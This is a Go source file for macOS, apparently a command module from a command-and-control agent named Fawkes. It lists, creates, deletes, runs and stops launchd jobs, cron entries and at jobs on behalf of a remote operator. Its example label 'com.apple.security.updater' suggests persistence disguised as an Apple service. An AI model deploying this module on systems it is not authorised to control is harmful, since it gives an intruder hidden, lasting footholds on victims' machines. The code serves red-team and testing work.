//go:build darwin

package commands

import (
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"strings"

	"fawkes/pkg/structs"
)

type SchtaskCommand struct{}

func (c *SchtaskCommand) Name() string {
	return "schtask"
}

func (c *SchtaskCommand) Description() string {
	return "Manage macOS scheduled tasks: launchd (LaunchAgents/LaunchDaemons), crontab, and at jobs (list, query, create, delete, run, enable, disable, stop)"
}

func (c *SchtaskCommand) Execute(task structs.Task) structs.CommandResult {
	args, parseErr := requireParams[schtaskArgs](task)
	if parseErr != nil {
		return *parseErr
	}

	switch strings.ToLower(args.Action) {
	case "list":
		return schtaskUnixListCommon(args.Filter, enumerateLaunchdJobs())
	case "query":
		return schtaskDarwinQuery(args)
	case "create":
		return schtaskDarwinCreate(args)
	case "delete":
		return schtaskDarwinDelete(args)
	case "run":
		return schtaskDarwinRun(args)
	case "enable":
		return schtaskDarwinSetEnabled(args, true)
	case "disable":
		return schtaskDarwinSetEnabled(args, false)
	case "stop":
		return schtaskDarwinStop(args)
	default:
		return errorf("Unknown action: %s. Use: list, query, create, delete, run, enable, disable, stop", args.Action)
	}
}

func enumerateLaunchdJobs() []schtaskListEntry {
	var entries []schtaskListEntry

	launchdDirs := []struct {
		path  string
		scope string
	}{
		{"/Library/LaunchDaemons", "system-daemon"},
		{"/Library/LaunchAgents", "system-agent"},
	}

	if home, err := os.UserHomeDir(); err == nil {
		launchdDirs = append(launchdDirs, struct {
			path  string
			scope string
		}{filepath.Join(home, "Library", "LaunchAgents"), "user-agent"})
	}

	for _, dir := range launchdDirs {
		files, err := os.ReadDir(dir.path)
		if err != nil {
			continue
		}
		for _, f := range files {
			if f.IsDir() || !strings.HasSuffix(f.Name(), ".plist") {
				continue
			}
			label := strings.TrimSuffix(f.Name(), ".plist")
			state := "loaded"

			out, err := execCmdTimeout("launchctl", "list", label)
			if err != nil {
				state = "unloaded"
			} else if strings.Contains(string(out), "\"PID\"") {
				state = "running"
			}

			entries = append(entries, schtaskListEntry{
				Name:  fmt.Sprintf("%s [%s]", label, dir.scope),
				State: state,
				Type:  "launchd",
			})
		}
	}

	out, err := execCmdTimeout("launchctl", "list")
	if err == nil {
		lines := strings.Split(string(out), "\n")
		for _, line := range lines[1:] {
			fields := strings.Fields(line)
			if len(fields) < 3 {
				continue
			}
			label := fields[2]
			if label == "" || label == "Label" {
				continue
			}
			alreadyListed := false
			for _, e := range entries {
				if strings.HasPrefix(e.Name, label+" ") {
					alreadyListed = true
					break
				}
			}
			if alreadyListed {
				continue
			}

			pid := fields[0]
			state := "loaded"
			if pid != "-" && pid != "0" {
				state = "running"
			}

			entries = append(entries, schtaskListEntry{
				Name:  fmt.Sprintf("%s [active]", label),
				State: state,
				Type:  "launchd",
			})
		}
	}

	return entries
}

func schtaskDarwinQuery(args schtaskArgs) structs.CommandResult {
	if args.Name == "" {
		return errorResult("name is required for query (launchd label or at job ID)")
	}

	if strings.HasPrefix(args.Name, "at-job-") || isNumeric(args.Name) {
		return queryAtJob(args.Name)
	}

	label := args.Name
	out, err := execCmdTimeout("launchctl", "list", label)
	if err != nil {
		return errorf("querying launchd job '%s': %v\n%s", label, err, string(out))
	}

	plistPath := findPlistPath(label)
	result := fmt.Sprintf("Launchd Job: %s\n%s", label, string(out))
	if plistPath != "" {
		result += fmt.Sprintf("\nPlist: %s", plistPath)
		data, readErr := os.ReadFile(plistPath)
		if readErr == nil {
			result += fmt.Sprintf("\n\n--- Plist Content ---\n%s", truncateStr(string(data), 2000))
		}
	}

	return successResult(result)
}

func schtaskDarwinCreate(args schtaskArgs) structs.CommandResult {
	if args.Program == "" {
		return errorResult("program is required for task creation")
	}

	trigger := strings.ToLower(args.Trigger)
	if trigger == "launchd" || trigger == "launchagent" || trigger == "launchdaemon" {
		return schtaskDarwinCreateLaunchd(args)
	}
	if trigger == "at" {
		return schtaskCreateAt(args)
	}
	return schtaskCreateCron(args)
}

func schtaskDarwinCreateLaunchd(args schtaskArgs) structs.CommandResult {
	if args.Name == "" {
		return errorResult("name/label is required for launchd job creation (e.g., com.apple.security.updater)")
	}

	programPath := args.Program
	var programArgs []string
	programArgs = append(programArgs, programPath)
	if args.Args != "" {
		programArgs = append(programArgs, strings.Fields(args.Args)...)
	}

	interval := 0
	runAt := ""
	if args.Time != "" {
		runAt = args.Time
	}

	plist := macBuildPlist(args.Name, programArgs, runAt, interval)

	isDaemon := strings.ToLower(args.Trigger) == "launchdaemon"
	plistDir, err := getPlistDir(isDaemon)
	if err != nil {
		return errorf("determining plist directory: %v", err)
	}

	if err := os.MkdirAll(plistDir, 0755); err != nil {
		return errorf("creating directory %s: %v", plistDir, err)
	}

	plistPath := filepath.Join(plistDir, args.Name+".plist")
	if err := os.WriteFile(plistPath, []byte(plist), 0644); err != nil {
		return errorf("writing plist: %v", err)
	}

	out, loadErr := execCmdTimeout("launchctl", "load", "-w", plistPath)
	if loadErr != nil {
		return errorf("Plist written to %s but load failed: %v\n%s", plistPath, loadErr, string(out))
	}

	plistType := "LaunchAgent"
	if isDaemon {
		plistType = "LaunchDaemon"
	}
	return successf("Created %s:\n  Label:   %s\n  Path:    %s\n  Plist:   %s\n  Program: %s", plistType, args.Name, plistPath, plistPath, programPath)
}

func schtaskDarwinDelete(args schtaskArgs) structs.CommandResult {
	if args.Name == "" {
		return errorResult("name is required for deletion")
	}

	if strings.HasPrefix(args.Name, "at-job-") || isNumeric(args.Name) {
		jobID := strings.TrimPrefix(args.Name, "at-job-")
		out, err := execCmdTimeout("atrm", jobID)
		if err != nil {
			return errorf("deleting at job '%s': %v\n%s", jobID, err, string(out))
		}
		return successf("Deleted at job '%s'", jobID)
	}

	plistPath := findPlistPath(args.Name)
	if plistPath != "" {
		execCmdTimeout("launchctl", "unload", "-w", plistPath)
		if err := os.Remove(plistPath); err != nil {
			return errorf("removing plist '%s': %v", plistPath, err)
		}
		return successf("Deleted launchd job '%s' (removed %s)", args.Name, plistPath)
	}

	return deleteCronEntry(args)
}

func schtaskDarwinRun(args schtaskArgs) structs.CommandResult {
	if args.Name == "" {
		return errorResult("name is required to run a task (launchd label)")
	}

	out, err := execCmdTimeout("launchctl", "start", args.Name)
	if err != nil {
		return errorf("starting '%s': %v\n%s", args.Name, err, string(out))
	}
	return successf("Triggered execution of '%s'", args.Name)
}

func schtaskDarwinSetEnabled(args schtaskArgs, enabled bool) structs.CommandResult {
	if args.Name == "" {
		return errorResult("name is required (launchd label)")
	}

	plistPath := findPlistPath(args.Name)
	if plistPath == "" {
		return errorf("No plist found for '%s'", args.Name)
	}

	if enabled {
		out, err := execCmdTimeout("launchctl", "load", "-w", plistPath)
		if err != nil {
			return errorf("loading '%s': %v\n%s", args.Name, err, string(out))
		}
		return successf("Enabled launchd job '%s'", args.Name)
	}

	out, err := execCmdTimeout("launchctl", "unload", "-w", plistPath)
	if err != nil {
		return errorf("unloading '%s': %v\n%s", args.Name, err, string(out))
	}
	return successf("Disabled launchd job '%s'", args.Name)
}

func schtaskDarwinStop(args schtaskArgs) structs.CommandResult {
	if args.Name == "" {
		return errorResult("name is required to stop a task (launchd label)")
	}

	out, err := execCmdTimeout("launchctl", "stop", args.Name)
	if err != nil {
		return errorf("stopping '%s': %v\n%s", args.Name, err, string(out))
	}
	return successf("Stopped '%s'", args.Name)
}

// schtaskDarwinListJSON returns the list as JSON for testing
func schtaskDarwinListJSON() string {
	entries := enumerateLaunchdJobs()
	data, err := json.Marshal(entries)
	if err != nil {
		return fmt.Sprintf("Error: failed to marshal result: %v", err)
	}
	return string(data)
}
